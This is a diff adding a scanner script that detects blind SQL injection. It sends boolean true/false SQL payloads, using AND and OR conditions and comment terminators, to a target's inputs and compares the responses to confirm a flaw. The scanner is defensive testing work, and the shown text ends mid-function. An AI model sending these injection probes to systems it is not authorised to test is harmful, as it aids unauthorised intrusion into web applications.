@@ -1,0 +1,1793 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+#include reporting_helpers.inc;
+#include os_detection.inc;
+var targetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+targetUrl.path = scheme.path;
+targetUrl.getVar = "";
+var debug = false;
+var bounties = (getGlobalValue('Bounties') == 1);
+// class that tests an input from a scheme
+/**************************************************************************************************************/
+function classBlindSQLInj(scheme, inputIndex)
+{
+    this.scheme = scheme;
+    this.inputIndex = inputIndex;
+    this.variations = scheme.selectVariationsForInput(inputIndex);
+    
+	this.foundVulnOnVariation = false;    
+    
+    var internalIP = false;
+    
+    if (scanIP.search(/^(10\.|127\.|10\.|172\.16\.|192\.168\.)/) != -1) internalIP = true;
+    
+    if (!internalIP) {
+        this.longDuration = 6;
+        this.shortDuration = 2; 
+    }    
+    else {
+        this.longDuration = 3;
+        this.shortDuration = 1; 
+    }
+    this.isNumeric = true;
+    this.isBase64 = false;
+    this.responseIsStable = false;
+    this.inputIsStable = false;
+    this.responseTimingIsStable = false;
+    this.origValue = this.getOrigValue();
+    
+    this.confirmInjectionHistory = false;
+    
+    this.lastJob = null;
+    this.origBody = null;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.getOrigValue = function()
+{   
+    var value = "";
+    for (var i=0; i<this.variations.count; i++){
+        var varValue = this.scheme.getVariation(this.variations.item(i)).item(this.inputIndex);
+        
+        // if the value is not yet set      
+        if(value == "" && varValue != "") {
+            value = varValue;                       
+            //trace(value);
+        }   
+            
+        if (isNaN(varValue)) this.isNumeric = false;
+            
+        // if not numeric and the value is set then exit
+        if (!this.isNumeric && value != "") break;
+    }
+    
+    // trace(value);
+    if (value.match(/^[a-zA-Z0-9\+\/=\%]+$/)) { // check for base64 data
+        var decoded = b642plain(value);
+        if (decoded && decoded.match(/^[\r\n\t\x20-\x7E]+$/) && (plain2b64(decoded) == value))
+        {
+                value = decoded;
+                // trace("base64");
+                // found a value base64 encoded
+                this.isBase64 = true;
+        }
+    }
+    return value;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.extractTextFromBody = function(body)
+{
+    //trace('extractTextFromBody');
+    var tokens = htmlTokens(body);
+    var str = "";
+    var includeText = true;
+    
+    while (token = tokens.nextToken()) 
+    {
+        if (token.isTag)
+        {
+            if (token.tagName == 'STYLE') includeText = false;
+            else if (token.tagName == '/STYLE') includeText = true;
+            else if (token.tagName == 'SCRIPT') includeText = false;
+            else if (token.tagName == '/SCRIPT') includeText = true; 
+        }
+        
+        else
+        if (token.isText) 
+        {
+            if (includeText) str = str + token.raw + "\n";  
+        }
+    }   
+    
+    return str;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.filterBody = function(body, testValue)
+{   
+    var ct = this.lastJob.response.headerValue('content-type').toLowerCase();
+    //trace(ct);
+    if (ct == "" || ct.indexOf('html') != -1) 
+        body = this.extractTextFromBody(body);
+    
+    // remove possible time string
+    body = body.replace(/([0-1]?[0-9]|[2][0-3]):([0-5][0-9])[.|:]([0-9][0-9])/g, "");
+    body = body.replace(/time\s*[:]\s*\d+\.?\d*/g, "");
+	// if testValue is provided it needs to be removed from the response
+	if (testValue && this.origValue.length >= 4) {
+        body = body.replaceAll(testValue, "");
+    }
+    if (testValue && this.origValue && testValue.length > this.origValue.length) {
+        var partialValue = testValue.replaceAll(this.origValue, "");
+        body = body.replaceAll(partialValue, "");
+    }
+	if (this.origValue && this.origValue.length >= 4)
+		body = body.replaceAll(this.origValue, "");
+    //if (debug) trace("body filtered:" + body);
+    return body;    
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.alert = function(testValue)
+{   
+	this.foundVulnOnVariation = true;	
+	
+    var ri = new TReportItem();
+    ri.LoadFromFile("SQL_Injection.xml");
+    ri.name = "Blind SQL Injection";
+    ri.affects = this.scheme.path;
+    ri.alertPath = "Scripts/Blind SQL Injection";
+    ri.parameter = this.scheme.getInputName(this.inputIndex);
+    ri.parameterDefaultValue = this.origValue; 
+    ri.parameterValue = testValue;  
+    
+    // prepare request string for the blind sql injector
+    // this.scheme.setInputValue(this.inputIndex, "${injecthere}");
+    scheme.populateRequest(this.lastJob);
+    
+    ri.setHttpInfo(this.lastJob);
+    
+    ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
+    
+    if (this.confirmInjectionHistory) {    	
+    	ri.details = ri.details + "[break][break]Tests performed: " + this.confirmInjectionHistory + "[/ul]";
+    }
+    
+    if (this.origValue) {    	
+    	ri.details = ri.details + "[break] Original value: [bold]" + this.origValue + "[/bold]";
+    }
+    
+    //trace(ri.Details);
+    AddReportItem(ri);  
+}   
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.request = function(varIndex, value, timeout, dontEncode)
+{   
+    this.lastValue = value;
+    
+    //trace(value);
+    this.scheme.loadVariation(varIndex);
+    
+    if (this.isBase64) this.scheme.setInputValue(this.inputIndex, plain2b64(value));
+    else {
+    	if (dontEncode) this.scheme.setEncodedInputValue(this.inputIndex, value);
+    	else this.scheme.setInputValue(this.inputIndex, value);
+    }
+    this.lastJob = new THTTPJob();    
+    this.lastJob.checkForApplicationErrors = false;
+    //this.lastJob.forceConnectionClose = true;
+    this.lastJob.url = targetUrl;
+    scheme.populateRequest(this.lastJob);
+    
+    if (typeof(timeout) != 'undefined') {
+    	this.lastJob.timeout = timeout;
+    	// no retries
+    	this.lastJob.retries = 0;    	
+    }
+    
+    this.lastJob.request.addHeader('X-Requested-With', 'XMLHttpRequest', true); 
+ 
+    // populate referer tag - some sites may need it
+    if (!this.lastJob.request.headerExists('Referer'))
+        this.lastJob.request.addHeader('Referer', scanURL.url, false);
+ 
+    this.lastJob.execute();
+    
+    return (!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003));
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.checkIfResponseIsStable = function(varIndex)
+{   
+    variation = this.variations.item(varIndex);
+    var Time1 = 0;
+    var Time2 = 0;
+        
+    // send original value
+    var body1 = "";
+    if (!this.request(variation, this.origValue)) return false;
+    // if the original value takes too long don't test this input anymore
+    if (this.lastJob.wasError) return false;
+    body1 = this.filterBody(this.lastJob.response.body, this.origValue);
+    this.origBody = body1;
+    if (debug) trace("origBody=" + this.origBody);
+    Time1 = this.lastJob.responseDuration;
+    // send same value (to see if the response is different)
+    var body2 = "";
+    if (!this.request(variation, this.origValue)) return false;    
+    body2 = this.filterBody(this.lastJob.response.body, this.origValue);
+    Time2 = this.lastJob.responseDuration;  
+    // here we need to compute shortDuration and longDuration and determine if the reponse timing is stable
+    var min = Math.min(Time1, Time2)/1000;
+    var max = Math.max(Time1, Time2)/1000;
+    
+    this.shortDuration = (Math.max(this.shortDuration, max))+1; 
+    this.longDuration = this.shortDuration * 2;
+    // if time deviation is at least 2 seconds we mark the response timing as unstable.
+    if (max - min > this.shortDuration) this.responseTimingIsStable = false;
+    else this.responseTimingIsStable = true;
+    // determine if the response is stable
+    if (body2 != body1) 
+    {
+        this.responseIsStable = false;
+        return true;        
+    }  
+    else this.responseIsStable = true;  
+    // check we can stop already (empty response)
+    if (body1.length == 0) 
+    {
+    	if (debug) trace("input is not stable, body length is zero.");
+        this.inputIsStable = false;
+        return true;
+    }
+    
+    // send an invalid value (-1)
+    var body3 = "";
+    
+    var newValue = randStr(8);
+   
+    if (!this.request(variation, newValue)) return false;
+    body3 = this.filterBody(this.lastJob.response.body, newValue);
+    
+    min = Math.min(min, this.lastJob.responseDuration/1000);
+    max = Math.max(max, this.lastJob.responseDuration/1000);
+    
+    // if time deviation is at least 2 seconds we mark the response timing as unstable.
+    if (max - min > this.shortDuration) this.responseTimingIsStable = false;
+    else this.responseTimingIsStable = true;    
+       
+    // round them down not to have something like 3.22
+    this.shortDuration = Math.floor(this.shortDuration);    
+    this.longDuration = Math.floor(this.longDuration);
+    
+    // if short duration is too big we mark the response timing as unstable.   
+	if (this.shortDuration >= 10) this.responseTimingIsStable = false;
+       
+    if (debug) {
+		trace('adjusted this.shortDuration:' + this.shortDuration);
+		trace('adjusted this.longDuration:' + this.longDuration);     
+    }        
+        
+    // check if the input is stable 
+    if (body1 == body2 && body1 != body3) 
+    {
+        this.inputIsStable = true;
+        if (debug) trace("input is stable. good"); 
+    }
+    else 
+    {
+        this.inputIsStable = false;
+        if (debug) trace("input is NOT stable!"); 
+        
+        if (debug) {
+			trace("input is NOT stable, bodies difference (body1 == body2 && body1 != body3 is FALSE)");
+			trace("body1 len :" + body1.length);
+			trace("body2 len :" + body2.length);
+			trace("body3 len :" + body3.length);
+			trace("body1:" + body1);
+			trace("body2:" + body2);
+			trace("body3:" + body3);
+        }
+        
+    }       
+    
+    return true;
+}
+/**************************************************************************************************************/
+/* body comparison tests */
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.addToConfirmInjectionHistory = function(paramValue, trueOrFalse)
+{   
+	var trueOrFalseStr = "FALSE";
+	 
+	if (this.confirmInjectionHistory == false) this.confirmInjectionHistory = "[ul]";
+	if (trueOrFalse) trueOrFalseStr = "TRUE";
+	
+	this.confirmInjectionHistory = this.confirmInjectionHistory + "[li]" + paramValue + " => [bold]" + trueOrFalseStr + "[/bold][/li]";
+}
+classBlindSQLInj.prototype.addToConfirmInjectionHistoryTiming = function(paramValue, sleepStr)
+{   
+	if (this.confirmInjectionHistory == false) this.confirmInjectionHistory = "[ul]";
+	this.confirmInjectionHistory = this.confirmInjectionHistory + "[li]" + paramValue + " => [bold]" + sleepStr + " s[/bold][/li]";
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.confirmInjection = function(varIndex, quoteChar, likeInjection, confirmed)
+{   
+	if (debug) trace("confirmInjection " + varIndex + " , " + quoteChar + ", " + confirmed);
+	
+	// load scheme variation
+	variation = this.variations.item(varIndex);
+	// original value
+	var origValue = this.origValue;
+	// original body
+	var origBody = this.origBody;
+	// the body that gets returned during testing
+	var testBody = "";
+	// the parameter value to be returned if success
+	var paramValue = false;	
+	// a variable containing all the tests that were performed
+	this.confirmInjectionHistory = false;
+	
+	// random integer < 1000
+	var randNum = 10+(Math.floor(Math.random()*989));
+	
+	// random string	
+	var randString = randStr(4);
+	if (confirmed) randString = '000' + randString;
+	if (this.isNumeric) {
+		randString = randNum;
+	}
+	var equalitySign = "=";
+	// like injection
+	var likeStr = "";
+	if (likeInjection) {
+		likeStr = '%';
+		equalitySign = "!=";	
+	}
+	// for numbers, do some specific tests
+	if (this.isNumeric) {
+		// original value as integer
+		var origValueAsInt = parseInt(this.origValue);
+		// test TRUE  -------------------------------------------------------------
+		paramValue = "1*1*1*" + origValue;
+		if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);	        
+        if (testBody != origBody) {
+        	if (debug) {
+        		trace("failed numeric test 1");
+        		trace(testBody);
+        		trace(origBody);
+        	}
+        	return false;			
+        }
+        this.addToConfirmInjectionHistory(paramValue, true);
+        
+		// test FALSE  -----------------------------------------------------------
+		paramValue = origValue + "*" + randNum.toString() + "*" + (randNum-5).toString() + "*0";
+		if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+        	if (debug) {
+        		trace("failed numeric test 2");
+        		trace(testBody);
+        		trace(origBody);        		
+        	}
+        	return false;	   
+        }
+        this.addToConfirmInjectionHistory(paramValue, false); 
+        
+		// test FALSE  -------------------------------------------------------------
+		paramValue = (origValueAsInt + 10).toString() + "*5*2*999";
+		if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+        	if (debug) {
+        		trace("failed numeric test 3");
+        		trace(testBody);
+        		trace(origBody);
+        	}
+        	return false;        
+        }
+        this.addToConfirmInjectionHistory(paramValue, false);         
+		// test TRUE  -------------------------------------------------------------
+		paramValue = (origValueAsInt).toString() + "*1*1";
+		if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody != origBody) {
+        	if (debug) {
+        		trace("failed numeric test 4");
+        		trace(testBody);
+        		trace(origBody);
+        	}
+        	return false;        
+        }
+        this.addToConfirmInjectionHistory(paramValue, true); 
+        
+		// test TRUE  -------------------------------------------------------------
+		paramValue = "1*1*1*1*1*" + (origValueAsInt).toString();
+		if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody != origBody) {
+        	if (debug) {
+        		trace("failed numeric test 5");
+        		trace(testBody);
+        		trace(origBody);
+        	}
+        	return false;        
+        }
+        this.addToConfirmInjectionHistory(paramValue, true);        
+         
+		// test FALSE -------------------------------------------------------------
+		paramValue = (origValueAsInt + 10).toString() + "*1*1*0*1*1*" + randNum;
+		if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+        	if (debug) {
+        		trace("failed numeric test 6");
+        		trace(testBody);
+        		trace(origBody);
+			}        		
+        	return false;        
+        }
+        this.addToConfirmInjectionHistory(paramValue, false);          
+	} 
+	
+	// some tests for strings
+	else 
+	{
+		// test TRUE  -------------------------------------------------------------
+		paramValue = origValue + likeStr + quoteChar + " AND 2*3*8=6*8 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+		if (debug) {trace(paramValue);}
+	    if (!this.request(variation, paramValue)) return false;
+	    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+	    if (testBody != origBody) {
+	    	if (debug) {
+	    		trace("failed string test 1");
+        		trace(testBody);
+        		trace(origBody);
+	    	}
+	    	return false;
+	    }
+	    this.addToConfirmInjectionHistory(paramValue, true);
+		// test FALSE  -------------------------------------------------------------
+		paramValue = origValue + likeStr + quoteChar + " AND 2*3*8=6*9 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+		if (debug) {trace(paramValue);}
+	    if (!this.request(variation, paramValue)) return false;
+	    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+	    if (testBody == origBody) {
+	    	if (debug) {
+	    		trace("failed string test 2");
+        		trace(testBody);
+        		trace(origBody);
+	    	}
+	    	return false;
+	    }
+	    this.addToConfirmInjectionHistory(paramValue, false);
+		// test FALSE  -------------------------------------------------------------
+		paramValue = origValue + likeStr + quoteChar + " AND 3*3<(2*4) AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+		if (debug) {trace(paramValue);}
+	    if (!this.request(variation, paramValue)) return false;
+	    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+	    if (testBody == origBody) {
+	    	if (debug) {
+	    		trace("failed string test 3");
+        		trace(testBody);
+        		trace(origBody);
+	    	}
+	    	return false;
+	    }
+	    this.addToConfirmInjectionHistory(paramValue, false);
+		// test TRUE  -------------------------------------------------------------
+		paramValue = origValue + likeStr + quoteChar + " AND 3*2>(1*5) AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+		if (debug) {trace(paramValue);}
+	    if (!this.request(variation, paramValue)) return false;
+	    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+	    if (testBody != origBody) {
+	    	if (debug) {
+	    		trace("failed string test 4");
+        		trace(testBody);
+        		trace(origBody);
+	    	}
+	    	return false;
+	    }
+	    this.addToConfirmInjectionHistory(paramValue, true);
+        // test TRUE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 3*2*0>=0 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody != origBody) {
+            if (debug) {
+                trace("failed string test 5");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, true);
+        // test FALSE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+            if (debug) {
+                trace("failed string test 6");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, false);
+	}
+    var doCommonTests = true;
+    if (doCommonTests) {
+        // here are the common tests (that apply both to strings and numbers)
+        // test TRUE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 5*4=20 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody != origBody) {
+            if (debug) {
+                trace("failed common test 1");
+                    trace(testBody);
+                    trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, true);
+        // test FALSE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 5*4=21 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+            if (debug) {
+                trace("failed common test 2");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, false);
+        // test FALSE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 5*6<26 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+            if (debug) {
+                trace("failed common test 3");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, false);
+        // test TRUE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 7*7>48 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody != origBody) {
+            if (debug) {
+                trace("failed common test 4");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, true);
+        // test FALSE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 3*2*0=6 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody == origBody) {
+            if (debug) {
+                trace("failed common test 5");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, false);
+        // test TRUE  -------------------------------------------------------------
+        paramValue = origValue + likeStr + quoteChar + " AND 3*2*1=6 AND " + quoteChar + randString + quoteChar + equalitySign + quoteChar + randString + likeStr;
+        if (debug) {trace(paramValue);}
+        if (!this.request(variation, paramValue)) return false;
+        testBody = this.filterBody(this.lastJob.response.body, paramValue);
+        if (testBody != origBody) {
+            if (debug) {
+                trace("failed common test 6");
+                trace(testBody);
+                trace(origBody);
+            }
+            return false;
+        }
+        this.addToConfirmInjectionHistory(paramValue, true);
+    }
+	return paramValue;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.confirmInjectionWithOR = function(varIndex, quoteChar, confirmed, dontCommentRestOfQuery)
+{   
+	if (debug) trace("confirmInjectionWithOR " + varIndex + " , " + quoteChar + ", " + confirmed);
+	
+	// load scheme variation
+	variation = this.variations.item(varIndex);
+	// original value
+	var origValue = "-1";
+	// original body
+	var origBody = this.origBody;
+	// the body that gets returned during testing
+	var testBody = "";
+	// the parameter value to be returned if success
+	var paramValue = false;	
+	// a variable containing all the tests that were performed
+	this.confirmInjectionHistory = false;
+	
+	// random integer < 1000
+	var randNum = 10+(Math.floor(Math.random()*989));
+	
+	// random string	
+	var randString = randNum;
+	if (confirmed) randString = '000' + randString;
+	var equalitySign = "=";
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 2+" + randNum + "-" + randNum + "-1=0+0+0+1 -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed or test 1");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+    
+    var trueBody = testBody;
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3+" + randNum + "-" + randNum + "-1=0+0+0+1 -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed or test 2");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2<(0+5+" + randNum + "-" + randNum + ") -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed or test 3");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2>(0+5+" + randNum + "-" + randNum + ") -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed or test 4");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	
+	// here are the more complex tests 
+	
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 2+1-1-1=1 AND " + randString + "=" + randString + " -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed complex test 1");
+        		trace(testBody);
+        		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR " + randString + "=" + randString + " AND 3+1-1-1=1 -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed complex test 2");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2=5 AND " + randString + "=" + randString + " -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed complex test 3");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2=6 AND " + randString + "=" + randString + " -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed complex test 4");
+    		trace(testBody);
+    		trace(trueBody);
+		}    		
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2*0=6 AND " + randString + "=" + randString + " -- ";;
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed complex test 5");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2*1=6 AND " + randString + "=" + randString + " -- ";
+	if (dontCommentRestOfQuery) paramValue=paramValue.substring(0, paramValue.length - 4);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed complex test 6");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	return paramValue;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.confirmInjectionWithOR2 = function(varIndex, quoteChar, confirmed)
+{   
+	if (debug) trace("confirmInjectionWithOR2 " + varIndex + " , " + quoteChar + ", " + confirmed);
+	
+	// load scheme variation
+	variation = this.variations.item(varIndex);
+	// original value
+	var origValue = "-1";
+	// original body
+	var origBody = this.origBody;
+	// the body that gets returned during testing
+	var testBody = "";
+	// the parameter value to be returned if success
+	var paramValue = false;	
+	// a variable containing all the tests that were performed
+	this.confirmInjectionHistory = false;
+	
+	// random integer < 1000
+	var randNum = 10+(Math.floor(Math.random()*989));
+	
+	// random string	
+	var randString = randNum;
+	if (confirmed) randString = '000' + randString;
+	
+	var randStrLong = randStr(8);	
+	var equalitySign = "=";
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 2+" + randNum + "-" + randNum + "-1=0+0+0+1 or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed or test 1");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+    
+    var trueBody = testBody;
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3+" + randNum + "-" + randNum + "-1=0+0+0+1 or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed or test 2");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2<(0+5+" + randNum + "-" + randNum + ") or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed or test 3");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2>(0+5+" + randNum + "-" + randNum + ") or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed or test 4");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	
+	// here are the more complex tests 
+	
+	// test TRUE  -------------------------------------------------------------
